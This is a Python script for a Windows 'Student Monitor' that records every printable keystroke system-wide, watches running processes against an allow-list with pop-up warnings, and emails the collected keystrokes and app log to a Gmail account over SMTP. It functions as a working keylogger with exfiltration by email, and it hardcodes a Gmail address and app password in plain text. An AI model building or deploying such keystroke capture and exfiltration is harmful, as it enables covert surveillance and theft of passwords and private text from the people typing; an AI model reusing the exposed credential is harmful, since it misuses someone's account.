import pynput.keyboard as keyboard
import psutil
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from tkinter import messagebox
from datetime import datetime
import getpass
import tkinter.messagebox as messagebox
import sys
from pynput import keyboard 
import keyboard as kb       
import re
from pynput.keyboard import Key, Listener 
from lock import *
from unlock import *

# Force UTF-8 encoding to prevent Unicode errors
sys.stdout.reconfigure(encoding="utf-8")

# Configuration
KEYSTROKE_FILE = "keystrokes.log"
LOG_FILE = "application_log.txt"


# Allowed applications (updated with testing and DevOps tools)
ALLOWED_APPS = {
    "python.exe", "code.exe", "sublime_text.exe", "atom.exe", "vscode.exe", "eclipse.exe","pythonw.exe", "java.exe", "javac.exe", "python3.exe", "python3w.exe", "node.exe",
    "php.exe", "nodejs.exe", "html.exe", "c.exe", "cpp.exe", "csharp.exe", "perl.exe", "ruby.exe",
    "bash.exe", "powershell.exe", "sqlite3.exe", "sqlplus.exe", "mysql.exe", "psql.exe", "mongodb.exe", "staruml.exe", "oracle.exe", "anaconda.exe", "winword.exe","msword.exe", "excel.exe",
    "powerpoint.exe", "outlook.exe", "powerbi.exe", "sqlcmd.exe", "notepad++.exe","powerpnt.exe","dashost.exe","audiodg.exe",
    "robotframework.exe", "pytest.exe","pip.exe"
}

# Allowed applications
EMAIL_ADDRESS = "rudraproje000@gmail.com"
EMAIL_PASSWORD = "yaqkonnbqonrgcxb"  # Use an App Password
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SYSTEM_APPS = {
    "explorer.exe", "taskmgr.exe", "smartscreen.exe", "searchfilterhost.exe", "sppsvc.exe","searchprotocolhost.exe"
}


warning_count = {}  # Track warnings per app (separately)
tracked_apps = set()  # Apps opened after initial scan
start_time = time.time()

# Capture initial running apps (Exclude from warnings)
print("Scanning initial running applications...")
time.sleep(2)  # Wait 2 seconds
initial_apps = {p.name().lower() for p in psutil.process_iter(attrs=['name'])}
print(f"✅ Excluding initially running apps: {initial_apps}")


def log_key(key):
    """Logs keystrokes to a file, excluding special keys and saving human-readable text."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            if key.char.isprintable():  # Only allow printable characters (letters, digits, symbols)
                with open(KEYSTROKE_FILE, "a", encoding="utf-8") as f:
                    f.write(key.char)
        elif key == Key.space:
            with open(KEYSTROKE_FILE, "a", encoding="utf-8") as f:
                f.write(" ")
    except AttributeError:
        pass  # Ignore any non-character keys



def monitor_keys():
    """Monitors keystrokes continuously."""
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

def monitor_applications():
    """Monitors new applications and warns if unauthorized ones are opened."""
    global tracked_apps

    while True:
        running_apps = {p.name().lower() for p in psutil.process_iter(attrs=['name'])}

        # Detect newly opened apps
        new_apps = running_apps - tracked_apps
        tracked_apps = running_apps  # Update tracked apps

        current_time = time.time()
        if current_time - start_time > 2:  # Start monitoring after initial exclusion

            for app in new_apps:
                if app not in ALLOWED_APPS and app not in SYSTEM_APPS and app not in initial_apps:
                    username = getpass.getuser()
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_entry = f"{username}, {app}, {timestamp}"

                    # Log application usage
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"{log_entry}\n")

                    # Initialize warning count for each program separately
                    if app not in warning_count:
                        warning_count[app] = 0

                    # Keep checking if the app is still running
                    while app in {p.name().lower() for p in psutil.process_iter(attrs=['name'])}:
                        warning_count[app] += 1
                        messagebox.showwarning("Restricted Application", 
                                               f"Warning {warning_count[app]}: {app} is not allowed!")

                        # Send email after 3 warnings for the specific app
                        if warning_count[app] == 3:
                            send_email_alert(f"Application {app} has been opened multiple times.")

                        time.sleep(1)  # Wait 1 second before next warning

        time.sleep(1)  # Reduced delay to 1 sec for real-time monitoring

def send_email_alert(custom_message=None):
    """Sends an email alert with logs in a structured template, only including human-readable text."""
    
    try:
        username = getpass.getuser()

        # Read application log
        app_log = "No application logs available."
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                app_log = f.read().strip() or "No new applications opened."

        # Read keystrokes log
        keystrokes = "No keystrokes recorded."
        if os.path.exists(KEYSTROKE_FILE):
            with open(KEYSTROKE_FILE, "r", encoding="utf-8") as f:
                keystrokes = f.read().strip() or "No keystrokes captured."

        # Clean up keystrokes: Remove non-printable keys like Key.backspace, [Key.ctrl_l], etc.
        # Remove anything like [Key.backspace], [Key.ctrl_l], or any other special key sequences
        cleaned_keystrokes = re.sub(r'\[Key\.[^\]]*\]', ' ', keystrokes)

        # Split the cleaned keystrokes into readable text
        # Remove excessive spaces and join the text into a readable form
        readable_keystrokes = ' '.join(cleaned_keystrokes.split())

        # Email Content (Formatted)
        email_body = f"""
        <html>
        <body>
            <h2 style="color: #d9534f;">📌 Student Monitor Alert</h2>
            <p><b>Username:</b> {username}</p>
            <h3>🖥️ Applications Opened:</h3>
            <pre style="background: #f4f4f4; padding: 10px; border-radius: 5px;">{app_log}</pre>
            <h3>⌨️ Keystrokes Captured:</h3>
            <pre style="background: #f4f4f4; padding: 10px; border-radius: 5px;">{readable_keystrokes}</pre>
            <p style="color: gray; font-size: 12px;">Generated automatically by the monitoring system.</p>
        </body>
        </html>
        """

        # Construct Email
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = f"Activity Report - {username}"
        msg.attach(MIMEText(email_body, "html"))

        # Send Email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("✅ Email sent successfully!")
    except Exception as e:
        print(f"❌ Email sending failed: {e}")

def start_monitoring():
    """Starts the monitoring threads."""

    threading.Thread(target=monitor_keys, daemon=True).start()
    threading.Thread(target=monitor_applications, daemon=True).start()



if __name__ == "__main__":
    start_monitoring() 
    while True:
        time.sleep(1)  # Keep the main thread running
